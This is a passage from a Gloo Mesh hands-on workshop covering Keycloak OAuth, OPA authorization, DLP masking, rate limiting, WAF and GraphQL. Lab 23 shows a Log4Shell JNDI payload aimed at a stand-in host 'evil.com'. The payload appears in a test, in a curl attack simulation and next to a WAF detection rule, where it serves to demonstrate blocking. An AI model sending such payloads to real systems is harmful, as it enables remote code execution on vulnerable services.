  it('keycloak pods are ready in cluster1', () => helpers.checkDeployment({ context: process.env.MGMT, namespace: "keycloak", k8sObj: "keycloak" }));
});
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/deploy-keycloak/tests/pods-available.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

<!--bash
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

describe("Retrieve enterprise-networking ip", () => {
  it("A value for load-balancing has been assigned", () => {
    let cli = chaiExec("kubectl --context " + process.env.MGMT + " -n keycloak get svc keycloak -o jsonpath='{.status.loadBalancer}'");
    expect(cli).to.exit.with.code(0);
    expect(cli).output.to.contain('"ingress"');
  });
});
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/deploy-keycloak/tests/keycloak-ip-is-attached.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

Then, we will configure it and create two users:

- User1 credentials: `user1/password`
  Email: user1@example.com

- User2 credentials: `user2/password`
  Email: user2@solo.io

<!--bash
until [[ $(kubectl --context ${MGMT} -n keycloak get svc keycloak -o json | jq '.status.loadBalancer | length') -gt 0 ]]; do
  sleep 1
done
-->

Let's set the environment variables we need:

```bash
export ENDPOINT_KEYCLOAK=$(kubectl --context ${MGMT} -n keycloak get service keycloak -o jsonpath='{.status.loadBalancer.ingress[0].*}'):8080
export HOST_KEYCLOAK=$(echo ${ENDPOINT_KEYCLOAK%:*})
export PORT_KEYCLOAK=$(echo ${ENDPOINT_KEYCLOAK##*:})
export KEYCLOAK_URL=http://${ENDPOINT_KEYCLOAK}
```

<!--bash
cat <<'EOF' > ./test.js
const dns = require('dns');
const chaiHttp = require("chai-http");
const chai = require("chai");
const expect = chai.expect;
chai.use(chaiHttp);
const { waitOnFailedTest } = require('./tests/utils');

afterEach(function(done) { waitOnFailedTest(done, this.currentTest.currentRetry())});

describe("Address '" + process.env.HOST_KEYCLOAK + "' can be resolved in DNS", () => {
    it(process.env.HOST_KEYCLOAK + ' can be resolved', (done) => {
        return dns.lookup(process.env.HOST_KEYCLOAK, (err, address, family) => {
            expect(address).to.be.an.ip;
            done();
        });
    });
});
EOF
echo "executing test ./gloo-mesh-2-0/tests/can-resolve.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->
<!--bash
echo "Waiting for Keycloak to be ready at $KEYCLOAK_URL/realms/master/protocol/openid-connect/token"
timeout 300 bash -c 'while [[ "$(curl -m 2 -s -o /dev/null -w ''%{http_code}'' $KEYCLOAK_URL/realms/master/protocol/openid-connect/token)" != "405" ]]; do printf '.';sleep 1; done' || false
-->

Now, we need to get a token:

```bash
export KEYCLOAK_TOKEN=$(curl -Ssm 10 --fail-with-body \
  -d "client_id=admin-cli" \
  -d "username=admin" \
  -d "password=admin" \
  -d "grant_type=password" \
  "$KEYCLOAK_URL/realms/master/protocol/openid-connect/token" |
  jq -r .access_token)
```

After that, we configure Keycloak:

```bash
# Create initial token to register the client
read -r client token <<<$(curl -Ssm 10 --fail-with-body -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -H "Content-Type: application/json" \
  -d '{ "expiration": 0, "count": 1 }' \
  $KEYCLOAK_URL/admin/realms/master/clients-initial-access |
  jq -r '[.id, .token] | @tsv')
KEYCLOAK_CLIENT=${client}

# Register the client
read -r id secret <<<$(curl -Ssm 10 --fail-with-body -H "Authorization: bearer ${token}" -H "Content-Type: application/json" \
  -d '{ "clientId": "'${KEYCLOAK_CLIENT}'" }' \
  ${KEYCLOAK_URL}/realms/master/clients-registrations/default |
  jq -r '[.id, .secret] | @tsv')
KEYCLOAK_SECRET=${secret}

# Add allowed redirect URIs
curl -m 10 --fail-with-body -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -H "Content-Type: application/json" \
  -X PUT -d '{ "serviceAccountsEnabled": true, "directAccessGrantsEnabled": true, "authorizationServicesEnabled": true, "redirectUris": ["'https://cluster1-httpbin.example.com'/*","'https://cluster1-portal.example.com'/*","'https://cluster1-backstage.example.com'/*"] }' \
  ${KEYCLOAK_URL}/admin/realms/master/clients/${id}

# Set access token lifetime to 30m (default is 1m)
curl -m 10 --fail-with-body -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -H "Content-Type: application/json" \
  -X PUT -d '{ "accessTokenLifespan": 1800 }' \
  ${KEYCLOAK_URL}/admin/realms/master

# Add the group attribute in the JWT token returned by Keycloak
curl -m 10 --fail-with-body -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -H "Content-Type: application/json" \
  -d '{ "name": "group", "protocol": "openid-connect", "protocolMapper": "oidc-usermodel-attribute-mapper", "config": { "claim.name": "group", "jsonType.label": "String", "user.attribute": "group", "id.token.claim": "true", "access.token.claim": "true" } }' \
  ${KEYCLOAK_URL}/admin/realms/master/clients/${id}/protocol-mappers/models

# Add the show_personal_data attribute in the JWT token returned by Keycloak
curl -m 10 --fail-with-body -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -H "Content-Type: application/json" \
  -d '{ "name": "show_personal_data", "protocol": "openid-connect", "protocolMapper": "oidc-usermodel-attribute-mapper", "config": { "claim.name": "show_personal_data", "jsonType.label": "String", "user.attribute": "show_personal_data", "id.token.claim": "true", "access.token.claim": "true"} } ' \
  ${KEYCLOAK_URL}/admin/realms/master/clients/${id}/protocol-mappers/models

# Create first user
curl -m 10 --fail-with-body -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -H "Content-Type: application/json" \
  -d '{ "username": "user1", "email": "user1@example.com", "enabled": true, "attributes": { "group": "users" }, "credentials": [ { "type": "password", "value": "password", "temporary": false } ] }' \
  ${KEYCLOAK_URL}/admin/realms/master/users

# Create second user
curl -m 10 --fail-with-body -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -H "Content-Type: application/json" \
  -d '{ "username": "user2", "email": "user2@solo.io", "enabled": true, "attributes": { "group": "users", "show_personal_data": false }, "credentials": [ { "type": "password", "value": "password", "temporary": false } ] }' \
  ${KEYCLOAK_URL}/admin/realms/master/users

```

> **Note:** If you get a *Not Authorized* error, please, re-run the following command and continue from the command that started to fail:

```
KEYCLOAK_TOKEN=$(curl -m 2 -d "client_id=admin-cli" -d "username=admin" -d "password=admin" -d "grant_type=password" "$KEYCLOAK_URL/realms/master/protocol/openid-connect/token" | jq -r .access_token)
```




## Lab 19 - Securing the access with OAuth <a name="lab-19---securing-the-access-with-oauth-"></a>
[<img src="https://img.youtube.com/vi/fKZjr0AYxYs/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/fKZjr0AYxYs "Video Link")

In this step, we're going to secure the access to the `httpbin` service using OAuth.

First, we need to create a Kubernetes Secret that contains the OIDC secret:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
kind: Secret
metadata:
  name: oauth
  namespace: httpbin
type: extauth.solo.io/oauth
data:
  client-secret: $(echo -n ${KEYCLOAK_SECRET} | base64)
EOF
```

Then, you need to create an `ExtAuthPolicy`, which is a CRD that contains authentication information: 

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: security.policy.gloo.solo.io/v2
kind: ExtAuthPolicy
metadata:
  name: httpbin
  namespace: httpbin
spec:
  applyToRoutes:
  - route:
      labels:
        oauth: "true"
  config:
    server:
      name: ext-auth-server
      namespace: gloo-mesh-addons
      cluster: cluster1
    glooAuth:
      configs:
      - oauth2:
          oidcAuthorizationCode:
            appUrl: "https://cluster1-httpbin.example.com"
            callbackPath: /callback
            clientId: ${KEYCLOAK_CLIENT}
            clientSecretRef:
              name: oauth
              namespace: httpbin
            issuerUrl: "${KEYCLOAK_URL}/realms/master/"
            logoutPath: /logout
            afterLogoutUrl: "https://cluster1-httpbin.example.com/get"
            session:
              failOnFetchFailure: true
              redis:
                cookieName: keycloak-session
                options:
                  host: redis:6379
            scopes:
            - email
            headers:
              idTokenHeader: jwt
            identityToken:
              claimsToHeaders:
                - claim: email
                  header: X-Email
EOF
```

Finally, you need to update the `RouteTable` to use this `ExtAuthPolicy`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: httpbin
  namespace: httpbin
  labels:
    expose: "true"
spec:
  http:
    - name: httpbin
      labels:
        oauth: "true"
      matchers:
      - uri:
          exact: /get
      - uri:
          exact: /logout
      - uri:
          prefix: /callback
      forwardTo:
        destinations:
        - ref:
            name: in-mesh
            namespace: httpbin
            cluster: cluster1
          port:
            number: 8000
EOF
```
<!--bash
ATTEMPTS=1
timeout 60 bash -c 'while [[ "$(curl -m 2 --max-time 2 --insecure -s -o /dev/null -w ''%{http_code}'' https://cluster1-httpbin.example.com/get)" != "302" ]]; do sleep 5; done'
export USER1_TOKEN=$(node tests/keycloak-token.js "https://cluster1-httpbin.example.com/get" user1)
export USER2_TOKEN=$(node tests/keycloak-token.js "https://cluster1-httpbin.example.com/get" user2)
until ([ ! -z "$USER1_TOKEN" ] && [[ $USER1_TOKEN != *"dummy"* ]]) || [ $ATTEMPTS -gt 20 ]; do
  printf "."
  ATTEMPTS=$((ATTEMPTS + 1))
  sleep 1
  export USER1_TOKEN=$(node tests/keycloak-token.js "https://cluster1-httpbin.example.com/get" user1)
done
until ([ ! -z "$USER2_TOKEN" ] && [[ $USER2_TOKEN != *"dummy"* ]]) || [ $ATTEMPTS -gt 20 ]; do
  printf "."
  ATTEMPTS=$((ATTEMPTS + 1))
  sleep 1
  export USER2_TOKEN=$(node tests/keycloak-token.js "https://cluster1-httpbin.example.com/get" user2)
done
echo "User1 token: $USER1_TOKEN"
echo "User2 token: $USER2_TOKEN"
-->

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Authentication is working properly", function () {
  const cookieString = process.env.USER1_TOKEN;

  it("The httpbin page isn't accessible without authenticating", () => helpersHttp.checkURL({ host: `https://cluster1-httpbin.example.com`, path: '/get', retCode: 302 }));

  it("The httpbin page is accessible after authenticating", () => helpersHttp.checkURL({ host: `https://cluster1-httpbin.example.com`, path: '/get', headers: [{ key: 'Cookie', value: cookieString }], retCode: 200 }));
});

EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/httpbin/gateway-extauth-oauth/tests/authentication.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->
<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Claim to header is working properly", function() {
  const cookieString = process.env.USER2_TOKEN;
  it('The new header has been added', () => helpersHttp.checkBody({ host: `https://cluster1-httpbin.example.com`, path: '/get', headers: [{ key: 'Cookie', value: cookieString }], body: '"X-Email": "user2@solo.io"' }));
});

EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/httpbin/gateway-extauth-oauth/tests/header-added.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

If you refresh the web browser, you will be redirected to the authentication page.

If you use the username `user1` and the password `password` you should be redirected back to the `httpbin` application.

Notice that we are also extracting information from the `email` claim, and putting it into a new header. This can be used for different things during our authz/authn flow, but most importantly we don't need any jwt-decoding library in the application anymore!

You can also perform authorization using OPA.

First, you need to create a `ConfigMap` with the policy written in rego:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: allow-solo-email-users
  namespace: httpbin
data:
  policy.rego: |-
    package test

    default allow = false

    allow {
        [header, payload, signature] = io.jwt.decode(input.state.jwt)
        endswith(payload["email"], "@solo.io")
    }
EOF
```

Then, you need to update the `ExtAuthPolicy` object to add the authorization step:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: security.policy.gloo.solo.io/v2
kind: ExtAuthPolicy
metadata:
  name: httpbin
  namespace: httpbin
spec:
  applyToRoutes:
  - route:
      labels:
        oauth: "true"
  config:
    server:
      name: ext-auth-server
      namespace: gloo-mesh-addons
      cluster: cluster1
    glooAuth:
      configs:
      - oauth2:
          oidcAuthorizationCode:
            appUrl: "https://cluster1-httpbin.example.com"
            callbackPath: /callback
            clientId: ${KEYCLOAK_CLIENT}
            clientSecretRef:
              name: oauth
              namespace: httpbin
            issuerUrl: "${KEYCLOAK_URL}/realms/master/"
            logoutPath: /logout
            afterLogoutUrl: "https://cluster1-httpbin.example.com/get"
            session:
              failOnFetchFailure: true
              redis:
                cookieName: keycloak-session
                options:
                  host: redis:6379
            scopes:
            - email
            headers:
              idTokenHeader: jwt
            identityToken:
              claimsToHeaders:
                - claim: email
                  header: X-Email
      - opaAuth:
          modules:
          - name: allow-solo-email-users
            namespace: httpbin
          query: "data.test.allow == true"
EOF
```

Refresh the web page. `user1` shouldn't be allowed to access it anymore since the user's email ends with `@example.com`.
<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Authentication is working properly", function () {

  const cookieString_user1 = process.env.USER1_TOKEN;
  const cookieString_user2 = process.env.USER2_TOKEN;

  it("The httpbin page isn't accessible with user1", () => helpersHttp.checkURL({ host: `https://cluster1-httpbin.example.com`, path: '/get', headers: [{ key: 'Cookie', value: cookieString_user1 }], retCode: "keycloak-session=dummy" == cookieString_user1 ? 302 : 403 }));
  it("The httpbin page is accessible with user2", () => helpersHttp.checkURL({ host: `https://cluster1-httpbin.example.com`, path: '/get', headers: [{ key: 'Cookie', value: cookieString_user2 }], retCode: 200 }));

});

EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/httpbin/gateway-extauth-oauth/tests/authorization.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->
If you open the browser in incognito and login using the username `user2` and the password `password`, you will now be able to access it since the user's email ends with `@solo.io`.

This diagram shows the flow of the request (with the Istio ingress gateway leveraging the `extauth` Pod to authorize the request):

![Gloo Mesh Gateway Extauth](images/steps/gateway-extauth-oauth/gloo-mesh-gateway-extauth.svg)




## Lab 20 - Use the transformation filter to manipulate headers <a name="lab-20---use-the-transformation-filter-to-manipulate-headers-"></a>


In this step, we're going to use a regular expression to extract a part of an existing header and to create a new one:

Let's create a `TransformationPolicy` to extract the claim.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: trafficcontrol.policy.gloo.solo.io/v2
kind: TransformationPolicy
metadata:
  name: modify-header
  namespace: httpbin
spec:
  applyToRoutes:
  - route:
      labels:
        oauth: "true"
  config:
    phase:
      postAuthz:
        priority: 2
    request:
      injaTemplate:
        extractors:
          organization:
            header: 'X-Email'
            regex: '.*@(.*)$'
            subgroup: 1
        headers:
          x-organization:
            text: "{{ organization }}"
EOF
```

You can see that it will be applied to our existing route and also that we want to execute it after performing the external authentication (to have access to the JWT token).

If you refresh the web page, you should see a new `X-Organization` header added to the request with the value `solo.io`

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Tranformation is working properly", function() {
  const cookieString = process.env.USER2_TOKEN;
  it('The new header has been added', () => helpersHttp.checkBody({ host: `https://cluster1-httpbin.example.com`, path: '/get', headers: [{ key: 'Cookie', value: cookieString }], body: '"X-Organization": "solo.io"' }));
});

EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/httpbin/gateway-transformation/tests/header-added.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->



## Lab 21 - Use the DLP policy to mask sensitive data <a name="lab-21---use-the-dlp-policy-to-mask-sensitive-data-"></a>
[<img src="https://img.youtube.com/vi/Uark0F4g47s/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/Uark0F4g47s "Video Link")


Now that we learnt how to put user information from the JWT to HTTP headers visible to the applications, those same applications could return sensitive or protected user information in the responses. 

In this step, we're going to use a Data Loss Prevention (DLP) Policy to mask data in response bodies and headers.

Let's create a `DLPPolicy` to mask protected user information.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: security.policy.gloo.solo.io/v2
kind: DLPPolicy
metadata:
  name: basic-dlp-policy
  namespace: httpbin
spec:
  applyToRoutes:
  - route:
      labels:
        oauth: "true"
  config:
    sanitize: ALL # Enable DLP masking for both responses bodies and access logs
    actions:
    - predefinedAction: ALL_CREDIT_CARDS # AMEX, VISA, MASTERCARD, JCB, DISCOVER, ETC.
    - predefinedAction: SSN # Social Security Number
    - customAction:
        regexActions:
        - regex: '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}' # Email
        - regex: 'eyJ[0-9a-zA-Z_-]+?\.[0-9a-zA-Z_-]+?\.[0-9a-zA-Z_-]+?' # JWT token
EOF
```

By default, the DLP policy will mask the email address with the character `X`, leaving 25% of the characters visible. 
Both character and percentage can be easily changed in the policy.

If you refresh the web page, you should see `X-Email` header masked as `XXXXXXXXXX.io`

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("DLP Policy", function () {
  const cookieString = process.env.USER2_TOKEN;

  it('Email is masked', () => helpersHttp.checkBody({ host: `https://cluster1-httpbin.example.com`, path: '/get', headers: [{ key: 'Cookie', value: cookieString }], body: 'XXXXXXXXXX.io' }));
});

EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/httpbin/gateway-dlp/tests/email-masked.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->



## Lab 22 - Apply rate limiting to the Gateway <a name="lab-22---apply-rate-limiting-to-the-gateway-"></a>


In this step, we're going to apply rate limiting to the Gateway to only allow 3 requests per minute for the users of the `solo.io` organization.

First, we need to create a `RateLimitServerConfig` object to define the limits based on the descriptors we will use later:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: RateLimitServerConfig
metadata:
  name: httpbin
  namespace: httpbin
spec:
  destinationServers:
  - ref:
      cluster: cluster1
      name: rate-limiter
      namespace: gloo-mesh-addons
    port:
      name: grpc
  raw:
    setDescriptors:
      - simpleDescriptors:
          - key: organization
            value: solo.io
        rateLimit:
          requestsPerUnit: 3
          unit: MINUTE
EOF
```

After that, we need to create a `RateLimitPolicy` object to define the descriptors:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: trafficcontrol.policy.gloo.solo.io/v2
kind: RateLimitPolicy
metadata:
  name: httpbin
  namespace: httpbin
spec:
  applyToRoutes:
  - route:
      labels:
        ratelimited: "true"
  config:
    serverSettings:
      name: rate-limit-server
      namespace: gloo-mesh-addons
      cluster: cluster1
    raw:
      rateLimits:
      - setActions:
        - requestHeaders:
            descriptorKey: organization
            headerName: X-Organization
    ratelimitServerConfig:
      name: httpbin
      namespace: httpbin
      cluster: cluster1
    phase:
      postAuthz:
        priority: 3

EOF
```

Finally, you need to update the `RouteTable` to use this `RateLimitPolicy`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: httpbin
  namespace: httpbin
  labels:
    expose: "true"
spec:
  http:
    - name: httpbin
      labels:
        oauth: "true"
        ratelimited: "true"
      matchers:
      - uri:
          exact: /get
      - uri:
          exact: /logout
      - uri:
          prefix: /callback
      forwardTo:
        destinations:
        - ref:
            name: in-mesh
            namespace: httpbin
          port:
            number: 8000
EOF
```

Refresh the web page multiple times.

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Rate limiting is working properly", function() {
  const cookieString = process.env.USER2_TOKEN;
  it('The httpbin page should be rate limited', () => helpersHttp.checkURL({ host: `https://cluster1-httpbin.example.com`, path: '/get', headers: [{ key: 'Cookie', value: cookieString }], retCode: 429 }));
});

EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/httpbin/gateway-ratelimiting/tests/rate-limited.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

You should get a `200` response code the first 3 time and a `429` response code after.

This diagram shows the flow of the request (with the Istio ingress gateway leveraging the `rate limiter` Pod to determine if the request should be allowed):

![Gloo Mesh Gateway Rate Limiting](images/steps/gateway-ratelimiting/gloo-mesh-gateway-rate-limiting.svg)

Let's apply the original `RouteTable` yaml:
```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: httpbin
  namespace: httpbin
  labels:
    expose: "true"
spec:
  http:
    - name: httpbin
      matchers:
      - uri:
          exact: /get
      forwardTo:
        destinations:
        - ref:
            name: in-mesh
            namespace: httpbin
            cluster: cluster1
          port:
            number: 8000
EOF
```

And also delete the different objects we've created:
```bash
kubectl --context ${CLUSTER1} -n httpbin delete ratelimitpolicy httpbin
kubectl --context ${CLUSTER1} -n httpbin delete ratelimitserverconfig httpbin
```





## Lab 23 - Use the Web Application Firewall filter <a name="lab-23---use-the-web-application-firewall-filter-"></a>
[<img src="https://img.youtube.com/vi/9q2TxtBDqrA/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/9q2TxtBDqrA "Video Link")

A web application firewall (WAF) protects web applications by monitoring, filtering, and blocking potentially harmful traffic and attacks that can overtake or exploit them.

Gloo Mesh includes the ability to enable the ModSecurity Web Application Firewall for any incoming and outgoing HTTP connections. 

An example of how using Gloo Mesh we'd easily mitigate the recent Log4Shell vulnerability ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)), which for many enterprises was a major ordeal that took weeks and months of updating all services.

The Log4Shell vulnerability impacted all Java applications that used the log4j library (common library used for logging) and that exposed an endpoint. You could exploit the vulnerability by simply making a request with a specific header. In the example below, we will show how to protect your services against the Log4Shell exploit. 

Using the Web Application Firewall capabilities you can reject requests containing such headers. 

Log4Shell attacks operate by passing in a Log4j expression that could trigger a lookup to a remote server, like a JNDI identity service. The malicious expression might look something like this: `${jndi:ldap://evil.com/x}`. It might be passed in to the service via a header, a request argument, or a request payload. What the attacker is counting on is that the vulnerable system will log that string using log4j without checking it. That’s what triggers the destructive JNDI lookup and the ultimate execution of malicious code.

Create the WAF policy:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: security.policy.gloo.solo.io/v2
kind: WAFPolicy
metadata:
  name: log4shell
  namespace: httpbin
spec:
  applyToRoutes:
  - route:
      labels:
        waf: "true"
  config:
    disableCoreRuleSet: true
    customInterventionMessage: 'Log4Shell malicious payload'
    customRuleSets:
    - ruleStr: |
        SecRuleEngine On
        SecRequestBodyAccess On
        SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|XML:/*|XML://@*  
          "@rx \\\${jndi:(?:ldaps?|iiop|dns|rmi)://" 
          "id:1000,phase:2,deny,status:403,log,msg:'Potential Remote Command Execution: Log4j CVE-2021-44228'"
EOF
```

In this example, we're going to update the main `RouteTable` to enforce this policy for all the applications exposed through the gateway (in any workspace).

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: main-httpbin
  namespace: istio-gateways
spec:
  hosts:
    - cluster1-httpbin.example.com
  virtualGateways:
    - name: north-south-gw
      namespace: istio-gateways
      cluster: cluster1
  workloadSelectors: []
  http:
    - name: root
      labels:
        waf: "true"
      matchers:
      - uri:
          prefix: /
      delegate:
        routeTables:
          - labels:
              expose: "true"
            workspace: httpbin
        sortMethod: ROUTE_SPECIFICITY
EOF
```

<!--bash
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
const helpersHttp = require('./tests/chai-http');
var chai = require('chai');
var expect = chai.expect;

describe("WAF is working properly", function() {
  it('The request has been blocked', () => helpersHttp.checkBody({ host: `https://cluster1-httpbin.example.com`, path: '/get', headers: [{key: 'x-my-header', value: '${jndi:ldap://evil.com/x}'}], body: 'Log4Shell malicious payload' }));
});

EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/httpbin/gateway-waf/tests/waf.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

Run the following command to simulate an attack:

```bash
curl -H "User-Agent: \${jndi:ldap://evil.com/x}" -k "https://cluster1-httpbin.example.com/get" -i
```

The request should be rejected:

```,nocopy
HTTP/2 403 
content-length: 27
content-type: text/plain
date: Tue, 05 Apr 2022 10:20:06 GMT
server: istio-envoy

Log4Shell malicious payload
```

Let's apply the original `RouteTable` yaml:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: main-bookinfo
  namespace: istio-gateways
spec:
  hosts:
    - cluster1-bookinfo.example.com
    - cluster2-bookinfo.example.com
  virtualGateways:
    - name: north-south-gw
      namespace: istio-gateways
      cluster: cluster1
  workloadSelectors: []
  http:
    - name: root
      matchers:
      - uri:
          prefix: /
      delegate:
        routeTables:
          - labels:
              expose: "true"
            workspace: bookinfo
          - labels:
              expose: "true"
            workspace: gateways
        sortMethod: ROUTE_SPECIFICITY
---
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: main-httpbin
  namespace: istio-gateways
spec:
  hosts:
    - cluster1-httpbin.example.com
  virtualGateways:
    - name: north-south-gw
      namespace: istio-gateways
      cluster: cluster1
  workloadSelectors: []
  http:
    - name: root
      matchers:
      - uri:
          prefix: /
      delegate:
        routeTables:
          - labels:
              expose: "true"
            workspace: httpbin
        sortMethod: ROUTE_SPECIFICITY
EOF
```

And also delete the waf policy we've created:

```bash
kubectl --context ${CLUSTER1} -n httpbin delete wafpolicies.security.policy.gloo.solo.io log4shell
```




## Lab 24 - Expose the bookinfo application through GraphQL <a name="lab-24---expose-the-bookinfo-application-through-graphql-"></a>
[<img src="https://img.youtube.com/vi/ucVMxX8oFz0/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/ucVMxX8oFz0 "Video Link")

Gloo Mesh is enhancing the Istio Ingress Gateway to allow exposing some REST services as a GraphQL API.

First, you need to create an `ApiDoc` to define your GraphQL API:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: apimanagement.gloo.solo.io/v2
kind: ApiDoc
metadata:
  name: bookinfo-api-doc
  namespace: bookinfo-frontends
  labels:
    expose: "true"
spec:
  graphql:
    schemaDefinition: |-
      type Query {
        """Description of a book in HTML"""
        productsForHome: [Product] 
      }
      """Each book has a product entry"""
      type Product {
        """Unique identifier for books"""
        id: String
        """The book title"""
        title: String
        """Number of pages in the book"""
        pages: Int
        """Year the book was published"""
        year: Int
        """Description of a book in HTML"""
        descriptionHtml: String
        """List of reader reviews for this book. Queries the reviews REST service"""
        reviews: [Review]
        """List of reader ratings for this book. Queries the ratings REST service"""
        ratings: [Rating]
      }
      """A book review"""
      type Review {
        """Name of the reviewer"""
        reviewer: String
        """Review details"""
        text: String
        "Reviewer Rating, this field is provided by the reviews REST service, which queries the ratings REST service"
        rating: ReviewerRating
      }
      type ReviewerRating {
        stars: Int
        color: String
      }
      """A book rating"""
      type Rating {
        """Name of the user peforming the rating"""
        reviewer: String
        """Number of stars for this rating"""
        numStars: Int
      }
EOF
```

Then, you need to create a `GraphQLResolverMap` to define the resolvers:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: apimanagement.gloo.solo.io/v2
kind: GraphQLResolverMap
metadata:
  name: bookinfo-graphql-resolvers
  namespace: bookinfo-frontends
  labels:
    expose: "true"
spec:
  types:
    Query:
      fields:
        productsForHome:
          resolvers:
          - restResolver:
              destinations:
              - port:
                  number: 9080
                ref:
                  name: productpage
                  namespace: bookinfo-frontends
                  cluster: cluster1
              request:
                headers:
                  :path:
                    jq: '"/api/v1/products"'
    Product:
      fields:
        reviews:
          variables:
            parentVar:
              graphqlParent: {}
            resolverResultVar:
              resolverResult: {}
          resolvers:
          - restResolver:
              destinations:
              - port:
                  number: 9080
                ref:
                  name: reviews
                  namespace: bookinfo-backends
                  cluster: cluster1
              request:
                headers:
                  :path:
                    jq: '"/reviews/" + (.parentVar.id | tostring)'
            resolverResultTransform:
              jq: '.resolverResultVar.reviews'
        ratings:
          variables:
            parentVar:
